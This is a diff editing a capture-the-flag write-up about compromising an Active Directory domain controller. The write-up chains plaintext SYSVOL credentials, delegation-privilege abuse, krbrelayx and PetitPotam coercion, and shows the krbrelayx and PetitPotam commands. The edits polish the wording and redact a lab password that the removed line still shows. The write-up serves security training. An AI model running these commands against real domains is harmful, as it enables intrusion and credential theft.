@@ -2,7 +2,7 @@
 
 # Delegate-WriteUp
 
-In this Windows Active Directory machine rated **Medium**, we'll compromise a Domain Controller by chaining several misconfigurations starting from unauthenticated SMB access. The key insight is that a logon script stored in SYSVOL leaks credentials in plaintext, and the compromised user has `SeEnableDelegationPrivilege`, which allows us to configure Unconstrained Delegation on a machine account we create. Ultimately capturing a TGT from the DC itself. You will learn how to:
+In this Windows Active Directory machine rated **Medium**, we'll compromise a Domain Controller by chaining several misconfigurations starting from unauthenticated SMB access. The key insight is that a logon script stored in SYSVOL leaks credentials in plaintext, and the compromised user has `SeEnableDelegationPrivilege`, which allows us to configure Unconstrained Delegation on a machine account we create, ultimately capturing a TGT from the DC itself. You will learn how to:
 
 - Enumerate SMB shares anonymously and read SYSVOL logon scripts
 - Extract plaintext credentials from `.bat` files in Group Policy scripts
@@ -121,7 +121,7 @@ Host script results:
 ```
 
 Domain is `delegate.vl`, DC hostname is `DC1`. Windows Server 2022 (build 20348). SMB signing is required, which rules out NTLM relay attacks over SMB.
-I add `delegate.vl` and `DC1.delegate.vl` to `/etc/hosts`
+We add `delegate.vl` and `DC1.delegate.vl` to `/etc/hosts`.
 
 ---
 
@@ -398,9 +398,9 @@ sudo python3 krbrelayx.py --krbsalt 'DELEGATE.VLEVILPC$' --krbpass 'EvilPass123!
 **Terminal 2** — Use `PetitPotam` to coerce `DC1` into authenticating to `EVILPC.delegate.vl`. PetitPotam abuses the MS-EFSRPC protocol to force a machine to send its credentials to an attacker-controlled server:
 
 ```bash
-python3 PetitPotam.py -u 'N.Thompson' -p 'KALEB_2341' -d delegate.vl \
+python3 PetitPotam.py -u 'N.Thompson' -p '<REDACTED>' -d delegate.vl \
   EVILPC.delegate.vl DC1.delegate.vl
-/home/n0name/Documents/HTBLabs/Machines/Medium/Delegate/PetitPotam.py:23: SyntaxWarning: "\ " is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\ "? A raw string is also an option.
+PetitPotam.py:23: SyntaxWarning: "\ " is an invalid escape sequence. Such sequences will not work in the future. Did you mean "\\ "? A raw string is also an option.
   | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
 
 
